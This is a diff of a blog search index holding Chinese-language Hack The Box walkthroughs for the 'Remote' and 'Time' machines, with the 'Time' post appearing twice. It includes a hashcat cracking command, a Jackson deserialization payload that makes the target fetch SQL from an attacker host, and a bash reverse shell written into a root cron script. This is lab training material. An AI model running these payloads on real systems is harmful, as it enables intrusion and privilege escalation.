+<p><code>hashcat -m 100 hash /usr/share/wordlists/rockyou.txt</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.78n1my1aje80.webp"
+                     
+                ></p>
+<p>尝试登陆一下网站后台</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5tmzjemn9lo0.webp"
+                     
+                ></p>
+<p>用rce脚本获取shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.36i7n0i5jhu0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5d1b6nl6ts40.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.od1a2p8z2v4.webp"
+                     
+                ></p>
+<p>检测脚本没有检测到任何可利用exp</p>
+<p><code>whoami /all</code>查看权限</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5ltkrvvt07g0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.179wwq5gvvpc.webp"
+                     
+                ></p>
+<p>在有这个权限的情况下可以使用<code>potato</code>进行提权，但这台机器是<code>windows server 2019</code>的，这个<code>potato</code>已经不可用了，有一个替代品叫<code>PrintSpoofer</code></p>
+<p><code>https://github.com/itm4n/PrintSpoofer</code></p>
+<p>原理也差不多，用这个去运行反弹shell的后门，即可获得权限</p>
+<p>msf生成反弹后门，将PrintSpoofer和反弹shell都上传到靶机</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.63yam9gzxf40.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.1xwus6i5lq9s.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5yq4oso1ibo0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.v82xxkwdmq8.webp"
                      
                 ></p>
 ]]></content>
@@ -15169,226 +15169,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Time - HackTheBox</title>
-    <url>/post/c94f0488a0bb/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.759cdsesknw0.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.2r5qaycb3n20.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.221tx4jcv39c.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4dkmjtvp40s0.webp"
-                     
-                ></p>
-<p>访问80端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3nbkhal39xo0.webp"
-                     
-                ></p>
-<p>可以选择两个模式</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5q0866u703w0.webp"
-                     
-                ></p>
-<p>输入数字的话就会输出同样的数字</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.37h2gq1hqw80.webp"
-                     
-                ></p>
-<p>输入英文就会输出null</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3gtpt37i3w20.webp"
-                     
-                ></p>
-<p>第二个模式直接报错了</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.75qrsn6ojdo0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4cyuwh9x1zo.webp"
-                     
-                ></p>
-<p>报错爆出了java的包信息，搜一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6sowgttqfg00.webp"
-                     
-                ></p>
-<p>有个exp，貌似是个Jackson的反序列化</p>
-<p><code>https://github.com/jas502n/CVE-2019-12384</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3go07qvx9pc0.webp"
-                     
-                ></p>
-<p>将项目clone下来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://localhost:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>
-
-<p>使用这个语句调用exp，先在本地试验一下，用python开启一个http服务</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7dxyth1vvsg0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3j2k0d5275a0.webp"
-                     
-                ></p>
-<p>会请求本地的inject.sql文件，之后便会执行文件内容</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7cuz466021c0.webp"
-                     
-                ></p>
-<p>在本地生成了一个txt文件，内部包含执行结果，修改inject.sql文件，反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.63v1n5jwkus0.webp"
-                     
-                ></p>
-<p>在80端口的输入框中执行语句</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://10.10.14.4:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5w4zecnfruw0.webp"
-                     
-                ></p>
-<p>第一个模式貌似不起作用</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4kmrfk6yohk0.webp"
-                     
-                ></p>
-<p>换第二个</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5kp7g1vg6fo0.webp"
-                     
-                ></p>
-<p>第二个也不行，还是报错，修改一下exp语句，将jruby test.rb和\都去掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://10.10.14.4:8000/inject.sql&#x27;&quot;&#125;]</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6t8lep53z1k0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.60ctbyuv6do0.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.1xlflhuk85nk.webp"
-                     
-                ></p>
-<p>发现一个当前用户所有的sh脚本文件</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5p4bordxcjk0.webp"
-                     
-                ></p>
-<p>这个脚本会将&#x2F;var&#x2F;www&#x2F;html目录下的所有文件进行压缩，并将压缩包移动到&#x2F;root目录下，感觉这像是一个定时执行的文件，用pspy64看一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7hqc8f7rhug0.webp"
-                     
-                ></p>
-<p>确实是定时执行，而且是root用户权限</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.60my61pdk2w.webp"
-                     
-                ></p>
-<p>而且当前用户对这个脚本文件是有可读写权限的，加一个反弹shell进去</p>
-<p><code>echo &quot;zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip &amp;&amp; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/7777 0&gt;&amp;1&#39;&quot; &gt; /usr/bin/timer_backup.sh</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6dtr00ihv6k0.webp"
-                     
-                ></p>
-<p>当该文件被执行时，会反弹个shell回来</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.b33aaj2yfz4.webp"
-                     
-                ></p>
-<p>反弹是反弹回来了，但是这个会话貌似会在几秒钟以内自动断开，趁着这几秒写一个密钥进去</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.2m8oxcdcz9m0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3gl1vgsf2ay0.webp"
-                     
-                ></p>
-<p>用密钥登录root用户</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.61kq9qklefc0.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Timelapse - HackTheBox</title>
     <url>/post/5ef055ee909e/</url>
     <content><![CDATA[<p><img  
@@ -16256,5 +16036,225 @@
 <p>前几次都是用的腾讯云、阿里云等云平台购买的服务器进行搭建，后面由于忘记续费，<del>没钱</del>，所导致以前的数据也都不存在了，这次又一时兴起，想整一个blog出来，想到购买合适的服务器，以及购买域名，和日常维护等等等等一堆乱七八糟的事情</p>
 <p>所以就考虑搭建一个静态的，维护起来也省事，这次所选用的是Hexo+Keep+GitHub的组合，省去了购买服务器与域名的钱，以及无需操心遭受攻击，<del>除非能把Github打穿</del></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>Time - HackTheBox</title>
+    <url>/post/c94f0488a0bb/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.759cdsesknw0.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.2r5qaycb3n20.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.221tx4jcv39c.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4dkmjtvp40s0.webp"
+                     
+                ></p>
+<p>访问80端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3nbkhal39xo0.webp"
+                     
+                ></p>
+<p>可以选择两个模式</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5q0866u703w0.webp"
+                     
+                ></p>
+<p>输入数字的话就会输出同样的数字</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.37h2gq1hqw80.webp"
+                     
+                ></p>
+<p>输入英文就会输出null</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3gtpt37i3w20.webp"
+                     
+                ></p>
+<p>第二个模式直接报错了</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.75qrsn6ojdo0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4cyuwh9x1zo.webp"
+                     
+                ></p>
+<p>报错爆出了java的包信息，搜一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6sowgttqfg00.webp"
+                     
+                ></p>
+<p>有个exp，貌似是个Jackson的反序列化</p>
+<p><code>https://github.com/jas502n/CVE-2019-12384</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3go07qvx9pc0.webp"
+                     
+                ></p>
+<p>将项目clone下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://localhost:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>
+
+<p>使用这个语句调用exp，先在本地试验一下，用python开启一个http服务</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7dxyth1vvsg0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3j2k0d5275a0.webp"
+                     
+                ></p>
+<p>会请求本地的inject.sql文件，之后便会执行文件内容</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7cuz466021c0.webp"
+                     
+                ></p>
+<p>在本地生成了一个txt文件，内部包含执行结果，修改inject.sql文件，反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.63v1n5jwkus0.webp"
+                     
+                ></p>
+<p>在80端口的输入框中执行语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://10.10.14.4:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5w4zecnfruw0.webp"
+                     
+                ></p>
+<p>第一个模式貌似不起作用</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4kmrfk6yohk0.webp"
+                     
+                ></p>
+<p>换第二个</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5kp7g1vg6fo0.webp"
+                     
+                ></p>
+<p>第二个也不行，还是报错，修改一下exp语句，将jruby test.rb和\都去掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://10.10.14.4:8000/inject.sql&#x27;&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6t8lep53z1k0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.60ctbyuv6do0.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.1xlflhuk85nk.webp"
+                     
+                ></p>
+<p>发现一个当前用户所有的sh脚本文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5p4bordxcjk0.webp"
+                     
+                ></p>
+<p>这个脚本会将&#x2F;var&#x2F;www&#x2F;html目录下的所有文件进行压缩，并将压缩包移动到&#x2F;root目录下，感觉这像是一个定时执行的文件，用pspy64看一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7hqc8f7rhug0.webp"
+                     
+                ></p>
+<p>确实是定时执行，而且是root用户权限</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.60my61pdk2w.webp"
+                     
+                ></p>
+<p>而且当前用户对这个脚本文件是有可读写权限的，加一个反弹shell进去</p>
+<p><code>echo &quot;zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip &amp;&amp; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/7777 0&gt;&amp;1&#39;&quot; &gt; /usr/bin/timer_backup.sh</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6dtr00ihv6k0.webp"
+                     
+                ></p>
+<p>当该文件被执行时，会反弹个shell回来</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.b33aaj2yfz4.webp"
+                     
+                ></p>
+<p>反弹是反弹回来了，但是这个会话貌似会在几秒钟以内自动断开，趁着这几秒写一个密钥进去</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.2m8oxcdcz9m0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3gl1vgsf2ay0.webp"
+                     
+                ></p>
+<p>用密钥登录root用户</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.61kq9qklefc0.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
   </entry>
 </search>
